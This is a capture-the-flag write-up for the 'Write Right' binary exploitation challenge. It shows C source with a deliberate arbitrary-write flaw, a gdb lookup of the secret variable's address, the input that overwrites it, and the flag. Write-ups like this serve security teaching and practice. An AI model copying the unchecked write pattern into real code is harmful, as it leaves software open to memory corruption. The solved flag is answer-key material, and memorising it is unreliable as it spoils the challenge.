### Solved by et0x

Write Right is a 50 point binary exploitation challenge.


> Can you change the secret? The binary can be found at /home/write_right/ on the shell server. The source can be found here. 

The source for the binary is the following:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

unsigned secret = 0xdeadbeef;

int main(int argc, char **argv){
    unsigned *ptr;
    unsigned value;

    char key[33];
    FILE *f;

    printf("Welcome! I will grant you one arbitrary write!\n");
    printf("Where do you want to write to? ");
    scanf("%p", &ptr);
    printf("Okay! What do you want to write there? ");
    scanf("%p", (void **)&value);

    printf("Writing %p to %p...\n", (void *)value, (void *)ptr);
    *ptr = value;
    printf("Value written!\n");

    if (secret == 0x1337beef){
        printf("Woah! You changed my secret!\n");
        printf("I guess this means you get a flag now...\n");

        f = fopen("flag.txt", "r");
        fgets(key, 32, f);
        fclose(f);
        puts(key);

        exit(0);
    }

    printf("My secret is still safe! Sorry.\n");
}
```

So this program allows an arbitrary write at the location in memory you specify, in this case, the location of "secret".

Looks like all we need to do is find the address of the variable.  Let's throw it into gdb.

```bash
pico1139@shell:/home/write_right$ gdb -q write_right
Reading symbols from write_right...(no debugging symbols found)...done.
(gdb) p &secret
$1 = (<data variable, no debug info> *) 0x804a03c <secret>
```

Our address is **0x804a03c**. Lets put 1337beef into that location and see what happens.  

```
pico1139@shell:/home/write_right$ ./write_right
Welcome! I will grant you one arbitrary write!
Where do you want to write to? 804a03c
Okay! What do you want to write there? 1337beef
Writing 0x1337beef to 0x804a03c...
Value written!
Woah! You changed my secret!
I guess this means you get a flag now...
```
The flag is **arbitrary_write_is_always_right**

